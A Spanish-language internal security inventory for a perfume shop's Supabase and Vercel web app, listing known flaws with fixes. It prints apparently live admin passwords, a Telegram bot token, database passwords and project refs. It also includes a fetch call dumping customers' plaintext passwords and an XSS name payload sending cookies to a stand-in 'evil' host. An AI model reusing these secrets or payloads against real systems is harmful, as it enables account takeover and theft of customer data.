# SECURITY.md — Inventario de seguridad de ST Perfumería

> **Última actualización:** Junio 27, 2026 (sábado · 2 hallazgos nuevos + verificación de S1 durante el test de `[FORGOT-PASS-A]` · ver nota en S1, addendum de S2 y el nuevo S10). Previa: Mayo 21, 2026 (post Plan B Supabase).
> **Estado general:** ⚠️ **Hay vulnerabilidades CRÍTICAS pendientes de fix.** Este documento es el ground truth de qué sabemos sobre seguridad del proyecto, qué está roto, qué está OK, y qué planeamos arreglar.
>
> **Audiencia:** Alejo + Claude Code de próximas sesiones. Cuando arranque la sesión `[SECURITY-AUDIT-S1]`, **leer este archivo primero.**

---

## 🚨 Issues CRÍTICOS · fix URGENTE (1-2 días)

### **S1 · Passwords del admin HARDCODED en HTML público**

**Severidad:** 🔴 CRÍTICA · explotable en 30 segundos por cualquiera con navegador.

**Archivos / líneas exactas:**
- `admin.html` línea **2766:** `var ADMIN_PASS = 'SANTOMY2026';`
- `admin.html` línea **2767:** `var ADMIN_PASS_EMPLEADO = 'CAFE_MATE_PROHIBIDO';`

**Cómo explotarlo (esto debe poderse hacer hoy mismo · es trivial):**
1. Cualquiera navega a `https://www.stperfumeria.com/admin.html`
2. Click derecho → "Ver código fuente" (Ctrl+U)
3. Ctrl+F · busca `ADMIN_PASS`
4. Lee los strings en plano
5. Va al login del admin con esa password · entra como jefe o empleado
6. Puede borrar ventas, cambiar stocks, ver datos de clientes, hacer cualquier cosa que las chicas pueden

**Impacto si se explota:**
- Acceso total al panel admin
- Cambiar precios / stock / fotos
- Ver datos de los 38 clientes (teléfonos, historial, puntos)
- Borrar registros de ventas
- Mandar push notifications spam a todos los suscriptores
- Subir fotos arbitrarias al bucket Storage

**Por qué se hizo así originalmente (probable):**
Antes que existiera Supabase Auth, el admin se protegía con un check JS simple (`if (pass === ADMIN_PASS)`). Cuando se migró a Supabase Auth, las constantes quedaron olvidadas. **Hoy las usa el flow nuevo? Hay que verificar:** mirar referencias a `ADMIN_PASS` en el código y ver si todavía se compara con el input del usuario.

**✅ Verificado 27-jun-2026 (durante el test de `[FORGOT-PASS-A]`):**
- Las líneas reales hoy son **L2778-2779** (no L2766-2767 · el archivo creció).
- **El login del admin YA NO usa estas constantes** · autentica contra Supabase Auth (`sb.auth.signInWithPassword`). El comentario en `admin.html` L2775-2777 lo confirma → **no es un login-bypass.**
- **`ADMIN_PASS_EMPLEADO` es código MUERTO** · sólo se declara, nunca se referencia → se puede borrar sin riesgo.
- **`ADMIN_PASS` SIGUE VIVO** · se usa como secreto compartido para llamar a `/api/send-notification` (`admin.html` L7229, validado server-side en Vercel). Al estar en JS público, cualquiera lo lee y puede mandar **push spam a todos los suscriptores**. Borrarlo NO es one-liner: hay que cambiar la auth del endpoint (validar la sesión de Supabase server-side en lugar del string estático) + rotar el secreto en Vercel.
- **Re-scoping de S1:** ya no es "robo de login del panel"; es (a) borrar la var muerta + (b) reemplazar el secreto del push por auth de sesión. Severidad efectiva 🔴→🟠, pero sigue siendo real.

**Fix recomendado (sin tirar pelota nueva):**
1. Eliminar completamente las constantes `ADMIN_PASS` y `ADMIN_PASS_EMPLEADO` del HTML
2. Verificar que el login flow YA usa solo Supabase Auth (`sb.auth.signInWithPassword`) · si depende de las constantes, ahí hay otro bug
3. **Después de eliminar las constantes**, las passwords del admin viven SOLO en `auth.users.encrypted_password` (hash bcrypt) del proyecto Supabase nuevo · NO en el HTML
4. Si las chicas necesitan resetear su password, vamos a darles el flow de "olvidé contraseña" (que también está pendiente · `[FORGOT-PASS-A]`)

**Acción inmediata recomendada por Alejo (antes del audit completo):**
- ⚠️ Considerar **cambiar las passwords del jefe y la empleada YA** (las que están en `auth.users` del proyecto nuevo de São Paulo) porque están expuestas en el HTML público.
- Pasos:
  1. Generar 2 passwords nuevas seguras
  2. Login a Supabase Dashboard del proyecto nuevo
  3. Authentication → Users → seleccionar `jefe@stperfumeria.local` → "Send password recovery" o cambiar directamente
  4. Mismo para `empleado@stperfumeria.local`
  5. Avisar a las chicas las passwords nuevas (por canal privado · NO chat ni email del cliente)
- Una vez hecho · las passwords del HTML (`SANTOMY2026` y `CAFE_MATE_PROHIBIDO`) ya no abren el admin · gano tiempo para el fix completo.

---

### **S2 · Pass de clientes en plano en tabla `clientes`**

**Severidad:** 🔴 CRÍTICA · pendiente desde antes (`[BCRYPT-MIGRATION]` documentado en HISTORIA.md).

**Donde está:**
- Tabla `public.clientes` columna `password` (texto plano)
- En el dump pre-migración (D:\backups\st-perfumeria-pre-migracion-20may2026.sql) se pueden ver TODOS los passwords de los 38 clientes en plano · 1 grep y los tenés todos

**Quién puede explotar:**
- Alguien con acceso a la BD via:
  - SQL injection (no la vi pero podría haber)
  - Acceso al dashboard de Supabase (si el password del owner se filtra)
  - Acceso al dump (D:\backups\ o GitHub Release si lo subes)

**Fix recomendado (`[BCRYPT-MIGRATION]`):**
- Implementar lazy migration: cuando un cliente hace login con su password en plano, el server (función SQL) hashea con bcrypt y reemplaza el valor en la columna. La próxima vez compara hash.
- Tras 6 meses, los clientes activos ya están migrados. Los inactivos pueden forzarse via reset.
- Esto está documentado como pendiente desde hace meses. Hoy SIGUE siendo crítico.

**⚠️ Exploitabilidad directa (hallado 27-jun-2026 · agrava S2):**
La tabla `clientes` tiene una policy `SELECT` para el rol `public` con `USING (true)` (policy "Leer clientes"). Como la **anon key vive en el JS público** (`js/app.js` / `admin.html`), cualquiera puede hacer hoy mismo, sin loguearse:

```js
fetch(SUPABASE_URL + '/rest/v1/clientes?select=telefono,password', {
  headers: { apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY }
})
```

y bajarse **TODOS los teléfonos + contraseñas en plano** de los clientes. No hace falta el dump ni acceso al dashboard · la anon key de **producción** alcanza. Esto convierte a S2 en explotable de forma remota y trivial, no sólo "si alguien accede a la BD".

**Por qué no se puede apretar la RLS a secas:** el login del cliente (`js/app.js`) lee `clientes` como `anon` para comparar la pass. Cerrar el `SELECT` público **rompe el login** hasta migrar a Supabase Auth + bcrypt. Por eso el fix va atado a `[BCRYPT-MIGRATION]`, no es un cambio de policy aislado.

**Mitigación posible sin romper login:** mover la verificación de pass a una función `SECURITY DEFINER` (RPC) que reciba `telefono`+`pass` y devuelva sólo un booleano; entonces el `SELECT password` deja de necesitar estar abierto a anon y la policy puede restringir columnas/filas.

---

## 🟡 Issues ALTOS · fix en 1-2 semanas

### **S3 · Bot token de Telegram + chat_id visibles en función SQL**

**Severidad:** 🟡 ALTA · el bot token permite a un atacante mandar mensajes en nombre del bot a cualquier chat al que tenga acceso.

**Donde está:**
- Función `public.send_telegram(msg text)` del schema `public` (en BOTH proyectos viejo y nuevo)
- Body de la función:
  ```sql
  bot_token TEXT := '8768088055:AAEMKidQXGv23KqwNDzMcip3agVvNdw_f-4';
  chat_id TEXT := '6071313124';
  ```

**Quién puede ver esto:**
- Cualquier user de Supabase con permiso `pg_get_functiondef` (que por default es bastante amplio · incluye el rol `anon` en algunos casos)
- Los usuarios admin (jefe + empleada) si saben SQL
- Cualquiera que tenga el dump pre-migración del paso 0

**Riesgo real:**
- Un atacante puede mandar mensajes spam o phishing al chat_id `6071313124` (Alejo)
- NO puede leer mensajes (Telegram bot API no permite eso al token-poseedor)
- NO puede acceder a otros chats donde el bot no esté

**Fix recomendado:**
1. Mover bot_token y chat_id a **Vault de Supabase** (`vault.secrets`) en el proyecto nuevo
2. Cambiar la función `send_telegram` para que lea de `vault` en lugar de constantes
3. Regenerar el bot_token actual (BotFather → `/revoke` → nuevo token) por las dudas
4. Actualizar el vault con el nuevo token

**Acción inmediata recomendada:**
- ⚠️ Revocar el bot token actual (al pegado en chat varias veces hoy) usando `/revoke` en BotFather de Telegram. Generar uno nuevo.
- Cambiar la función SQL `send_telegram` con el token nuevo.

---

### **S4 · Anon key del proyecto viejo sigue activa**

**Severidad:** 🟡 ALTA · mientras el proyecto viejo de Oregon esté activo (hasta el 28-may como rollback), su anon key sigue funcionando.

**Donde estaba:**
- En `admin.html` y `js/app.js` antes del commit `f532525` · JWT que arranca con `eyJhbGciOiJIUzI1NiIs...`
- Cualquiera que tenga el HTML de versiones anteriores (cacheado en su browser, archivado, etc.) puede usar esa key para leer del proyecto viejo

**Riesgo real:**
- Lectura del catálogo (lo que ya es público)
- ⚠️ Lectura de `clientes` (incluyendo passwords en plano · ver S2)
- Posiblemente otras tablas según RLS policies del viejo

**Fix recomendado:**
- A partir del **28-may-2026** (cuando se baje el proyecto viejo): pausar/borrar el proyecto en Supabase Dashboard. Esto invalida la anon key automáticamente.
- Antes de bajar: regenerar la anon key del viejo en Settings → API → Reset anon key (esto invalida la vieja inmediatamente · pero también rompe el rollback fácil)

**Decisión actual:** mantener anon key activa del viejo por safety net 7 días · aceptar el riesgo limitado (RLS protege la mayoría · clientes.password es el único dato leakeable critically).

---

### **S5 · DB passwords de ambos proyectos expuestas en chat**

**Severidad:** 🟡 ALTA · expuestas en chat de Claude Code de esta sesión (que va al servidor de Anthropic).

**Donde están:**
- DB password del proyecto viejo (`AxOWb4YU8YYVRLrQ`) · pegada en chat para que pueda hacer `pg_dump`
- DB password del proyecto nuevo (`e7SHNHvN68nekCMN`) · pegada en chat para que pueda hacer `psql`

**Quién puede acceder:**
- Anthropic (logs internos de las conversaciones de Claude · políticas estrictas pero técnicamente accesible)
- Cualquiera con acceso al device de Alejo si tiene el chat abierto

**Fix recomendado · ACCIÓN INMEDIATA:**
1. **Resetear DB password del proyecto nuevo** (sa-east-1 São Paulo):
   - Settings → Database → "Reset database password"
   - Generar nueva fuerte
   - **NO necesita rotación adicional** porque la DB password se usa SOLO para conexiones psql/pg_dump directas (que ahora no usamos)
2. **Resetear DB password del proyecto viejo** (us-west-2 Oregon) · idem
   - Pero ojo: si vas a hacer rollback antes de bajar el viejo, vas a necesitar reactivar las conexiones · tal vez postergar este reset hasta el 28-may cuando se vaya a baja

**Sin urgencia · pero hacerlo dentro de 48 horas.**

---

### **S6 · service_role keys de ambos proyectos manejadas en archivos temp**

**Severidad:** 🟡 ALTA · borrados ya, pero pasaron por disco local.

**Estado actual:**
- ✅ `D:\tmp\.env` BORRADO al final de la sesión 21-may
- ✅ `D:\tmp\plan-b-credentials.txt` BORRADO al final de la sesión 21-may
- ✅ Los archivos no se commitearon al repo en ningún momento

**Riesgo residual:**
- Quedan en el espacio libre del disco hasta que el SO sobreescriba esos sectores
- Si alguien tiene acceso físico al disco D:\ y herramientas forenses, puede recuperar los archivos borrados

**Fix recomendado:**
- Si el disco D:\ se va a usar en otra máquina o se va a vender · usar herramienta de borrado seguro (`sdelete -p 3 D:\tmp\.env` antes de borrar)
- Si el disco queda con Alejo · riesgo aceptable

---

### **S10 · Stored XSS · nombre de cliente sin escapar en el panel admin**

**Severidad:** 🟡 ALTA · hallado 27-jun-2026 durante el test de `[FORGOT-PASS-A]`.

**Dónde está:**
- `admin.html` (~L3900) · la tab "Clientes" (`renderClients`) inyecta `c.nombre` directo vía `innerHTML` sin escapar:
  ```js
  + '<div class="client-name">...' + c.nombre + blockedBadge + '</div>'
  ```
- Probablemente otros campos de texto libre del cliente (`c.nota`, `c.telefono2`) comparten el patrón.

**Cómo explotarlo:**
1. Un atacante se registra en el sitio público (signup abierto) con un nombre tipo `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`.
2. Cuando la chica (jefe o empleada) abre la tab "Clientes" en el panel, ese HTML se ejecuta **en su sesión admin autenticada**.
3. El payload puede robar tokens de sesión de Supabase, ejecutar acciones admin, exfiltrar datos de los clientes, etc.

**Impacto:** ejecución de JS arbitrario en el contexto del panel admin → escalada efectiva a "cualquier cosa que la chica puede hacer".

**Fix recomendado:**
- Escapar TODO texto libre del cliente antes de inyectarlo (`escapeHtml()` ya existe en `admin.html`, L7212). Aplicar en `renderClients` a `nombre`, `nota` y cualquier campo editable por el cliente.
- Auditar TODOS los `innerHTML` del panel que mezclen datos de usuario.
- ✅ En el código nuevo de "Pedidos pass" (commit `eefdfe9`) el nombre YA se escapa · este issue es para los lugares preexistentes.

---

## 🟢 Issues MEDIOS · revisar pero no urgente

### **S7 · admin.html accesible públicamente · cualquiera puede llegar al login**

**Severidad:** 🟢 MEDIA · no es un issue per se (es necesario para que las chicas accedan), pero combinado con S1 lo agrava.

**Mitigaciones existentes:**
- Lockout escalonado por intentos fallidos (5 intentos → bloqueo escalado en tiempo)
- Telegram notification cuando alguien intenta entrar
- `[LOGIN-RETRY-SP]` reintento silencioso pero NO cuenta timeouts como fallos

**Mitigaciones adicionales propuestas:**
- Path obfuscation: cambiar `admin.html` a `admin-X9k2.html` (security through obscurity · ayuda contra bots automatizados)
- Rate limiting en Vercel/Cloudflare (más robusto)
- Subir contador de fallos a 3 en lugar de 5 (más estricto)
- Email/Telegram alert ANTES del lockout (después de 2 intentos)

---

### **S8 · Bucket Storage `perfume-fotos` con policies muy permisivas**

**Severidad:** 🟢 MEDIA · permite anon upload/delete.

**Donde está:**
- `storage.objects` policies del schema `storage`:
  - `Upload fotos anon` · INSERT TO anon, authenticated
  - `Delete fotos anon` · DELETE TO anon, authenticated
  - `anon puede actualizar fotos perfumes` · UPDATE TO anon, authenticated

**Riesgo real:**
- Un atacante anónimo podría subir/borrar fotos del bucket
- En la práctica, requiere conocer el anon key (que está en el HTML público)
- Combinado con la flexibilidad de filename (sin sanitización), un atacante podría sobreescribir fotos legítimas con fakes

**Por qué se hizo así:**
- El admin sube fotos sin estar logueado en Supabase Auth (usa custom auth de tabla clientes para login admin · pero el INSERT al bucket se hace con anon key del cliente Supabase)
- Por eso las policies permiten anon

**Fix recomendado:**
- Migrar el flow de upload del admin a usar Supabase Auth (que las chicas estén loggeadas en `auth.users` cuando suben fotos)
- Restringir policies a `TO authenticated` solamente
- Agregar check de filename: `bucket_id = 'perfume-fotos' AND name ~ '^[a-zA-Z0-9_-]+\.webp$'` (whitelist)

---

### **S9 · `notifyTelegram` antes del Plan B era estable; post-Plan-B está roto**

**Severidad:** 🟢 MEDIA · funcionalidad rota, no es vulnerabilidad.

**Estado:** `[FIX-TELEGRAM-PG-NET]` pendiente (Task #26). pg_net habilitada en proyecto nuevo pero el worker no procesa requests.

**Workaround propuesto:**
- Cambiar `notifyTelegram` a `fetch` directo desde frontend (riesgo: token expuesto · ver S3 · se decidirá en `[SECURITY-AUDIT-S1]`)
- O diagnosticar y arreglar config de pg_net

---

## ✅ Lo que SÍ está OK (no tocar a la ligera)

| Cosa | Estado |
|---|---|
| Auth de admin via Supabase Auth | ✓ Funciona post Plan B (hashes bcrypt preservados) |
| RLS pública en tablas (`select_public USING true`) | ⚠️ Configurado en las 28 tablas · OK para el catálogo, **pero en `clientes` filtra teléfonos + passwords en plano a `anon`** (ver addendum de S2) · NO es "OK" para esa tabla |
| RLS escritura `auth.role() = 'authenticated'` | ✓ Configurado |
| Service role keys NO en frontend | ✓ Solo en env vars o `.env` local (borrado) |
| HTTPS en producción | ✓ Vercel auto |
| Storage CDN cache | ✓ 1 semana (`[CACHE-CONTROL-1W]`) |
| Service Worker · no cachea Supabase API | ✓ Configurado (`network-only` para `*.supabase.co`) |

---

## 📋 Estado actual del proyecto post-Plan-B

| Item | Detalles |
|---|---|
| **Proyecto Supabase activo** | sa-east-1 São Paulo · ref `znmjhproimtprptheumy` |
| **Proyecto Supabase legacy** | us-west-2 Oregon · ref `rtgjzzkjrwbkdhkslxix` · activo hasta 28-may como rollback |
| **Anon key activa** | `sb_publishable_Bb4Jo74f4Wh7vhz...` (nuevo formato Supabase, ~46 chars) |
| **DB password expuesta** | ⚠️ Sí · ambas en chat de esta sesión. Reset pendiente |
| **Bot Telegram token** | Expuesto en SQL function · pendiente migrar a Vault |
| **Service role keys** | NUNCA en repo · estuvieron en `D:\tmp\.env` (borrado) |
| **Backup dump pre-migración** | `D:\backups\st-perfumeria-pre-migracion-20may2026.sql` · 6.2 MB · conservar 7 días · contiene passwords en plano de clientes |

---

## 📅 Plan de acción priorizado · `[SECURITY-AUDIT-S1]`

**Próxima sesión (1-2 días desde hoy):**

1. **Sesión Claude↔Claude:**
   - Alejo abre ClaudeChat con este SECURITY.md como contexto
   - ClaudeChat hace análisis profundo y propone plan de fix para cada issue (priorizado)
   - ClaudeChat escribe `Prompt_para_ClaudeCode_SECURITY_AUDIT_S1.md` (similar al de Plan B)
   - Alejo valida el plan
   - Claude Code ejecuta paso a paso con disciplina

2. **Fix orden recomendado:**
   - 🔴 **S1 primero** (passwords hardcoded admin) · cualquier hora · 30 min
   - 🟡 **S3 después** (rotar bot token Telegram) · 15 min
   - 🟡 **S5** (rotar DB passwords expuestas) · 5 min cada una
   - 🔴 **S2 (BCRYPT-MIGRATION)** · más complejo · planear con cuidado · 2-3 horas
   - 🟡 **S4** se resuelve automáticamente al bajar proyecto viejo el 28-may
   - 🟢 **S8** (storage policies) · puede ir junto con BCRYPT-MIGRATION

3. **Verificación post-fix:**
   - Test E2E del admin con las passwords nuevas
   - Test E2E del frontend público
   - Confirmar que `notifyTelegram` sigue funcionando con el token nuevo (o ya con el workaround del `[FIX-TELEGRAM-PG-NET]`)
   - Revisar logs de Vercel y Supabase por errors anómalos

---

## 🚨 Acciones URGENTES Alejo puede hacer YA (sin sesión Claude)

Estas son cosas que podés hacer vos solo desde la UI · 5-10 min total:

1. **Cambiar password del jefe en `auth.users` del proyecto nuevo**:
   - `https://supabase.com/dashboard/project/znmjhproimtprptheumy/auth/users`
   - Click en `jefe@stperfumeria.local` → "..." → "Send password recovery" (no funciona porque no hay email real) → mejor: "Change password" directo · poner nueva
2. **Mismo para `empleado@stperfumeria.local`**
3. **Avisar a las chicas las passwords nuevas** por canal privado (WhatsApp directo, NO email)
4. **Resetear DB password de ambos proyectos** (Settings → Database → Reset) · ~30 seg cada uno
5. **Revocar bot Telegram con BotFather**:
   - Abrir Telegram → buscar `@BotFather`
   - `/mybots` → seleccionar tu bot ST Perfumería → "API Token" → "Revoke current token"
   - Te da un token nuevo · pegarlo en la función SQL `send_telegram` del proyecto nuevo (via SQL Editor)

Esto **mitiga 4 de los 6 issues críticos/altos** en 10 min de trabajo manual.

---

*Documento creado el 21-may-2026 · actualizar cada vez que se descubra/arregle un issue de seguridad · todos los keywords con corchetes deben estar también en HISTORIA.md*
